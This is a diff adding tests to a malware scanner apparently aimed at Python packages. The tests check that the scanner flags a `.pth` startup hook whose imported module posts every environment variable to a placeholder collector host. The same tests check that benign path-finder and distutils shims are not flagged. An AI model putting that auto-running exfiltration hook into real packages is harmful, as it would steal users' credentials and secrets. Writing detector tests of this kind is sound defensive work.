@@ -13178,6 +13178,76 @@ class TestStartupFilesRunAtInstall:
         assert not [f for f in findings if f.category.value != "operational"]
 
 
+class TestWhatAPthImportsRunsAtStartup:
+    """data_proxy_for_test 0.1.1: a root `.pth` of `import mcp_proxy.caching`, the module under
+    `src/`, sending what it gathers at module level. A `.pth` runs from site-packages, so its
+    import is the package's own module wherever the package keeps it."""
+
+    @staticmethod
+    def scan(tmp_path, files: dict[str, str]) -> set[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.foundation.config.settings import Config
+
+        for name, text in files.items():
+            path = tmp_path / name
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_text(text, encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        return {f.rule_id for f in result.findings if f.category.value == "malicious"}
+
+    def test_a_src_module_a_pth_imports_runs_at_startup(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "proxy_logging.pth": "import proxy.caching\n",
+                "src/proxy/__init__.py": "",
+                "src/proxy/caching.py": (
+                    "import json, os, urllib.request\n"
+                    "def cache_first():\n"
+                    "    body = json.dumps(dict(os.environ)).encode()\n"
+                    "    urllib.request.urlopen('https://collector.example.invalid/c', body)\n"
+                    "cache_first()\n"
+                ),
+            },
+        )
+        assert found, "the module a .pth imports was not read as startup code"
+
+    def test_a_pth_importing_a_path_finder_is_quiet(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "proxy_paths.pth": "import proxy.finder; proxy.finder.install()\n",
+                "src/proxy/__init__.py": "",
+                "src/proxy/finder.py": (
+                    "import os, sys\n"
+                    "def install():\n"
+                    "    sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'vendor'))\n"
+                ),
+            },
+        )
+        assert not found
+
+    def test_the_distutils_precedence_shim_is_quiet(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "distutils-precedence.pth": (
+                    "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
+                    "enabled = os.environ.get(var, 'local') == 'local'; "
+                    "enabled and __import__('_distutils_hack').add_shim(); \n"
+                ),
+                "_distutils_hack/__init__.py": (
+                    "import os, sys\n"
+                    "def enabled():\n"
+                    "    return os.environ.get('SETUPTOOLS_USE_DISTUTILS', 'local') == 'local'\n"
+                    "def add_shim():\n"
+                    "    sys.meta_path.insert(0, object())\n"
+                ),
+            },
+        )
+        assert not found
+
+
 class TestExecutablesNamedAsSource:
     def test_an_elf_named_py_contradicts_its_name(self) -> None:
         from cordon_scanner.detect.binary.detector import BinaryDetector
